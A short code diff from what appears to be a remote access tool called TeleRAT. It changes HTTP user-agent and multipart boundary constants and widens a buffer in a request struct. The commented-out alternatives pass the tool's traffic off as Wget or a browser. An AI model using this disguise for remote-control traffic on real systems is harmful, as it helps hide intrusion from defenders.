@@ -5,17 +5,18 @@
 #include <stdlib.h>
 #include <string.h>
 
-// #define USER_AGENT "TeleRAT/0.1.0"
-#define USER_AGENT "Wget/1.17.1 (linux-gnu)"
+#define USER_AGENT "TeleRAT/0.1.0"
+// #define USER_AGENT "Wget/1.17.1 (linux-gnu)"
 #define SERVER "TeleRAT"
-#define BOUNDARY "teleratboundary123456789"
+#define BOUNDARY "----TeleRATBoundary"
+// #define BOUNDARY "----WebKitFormBoundary7MA4YWxkTrZu0gW"
 
 struct http_request{
     char method[10];
     char path[256];
     char version[10];
     char host[256];
-    char content_type[20];
+    char content_type[50];
     unsigned int content_length;
 };
 
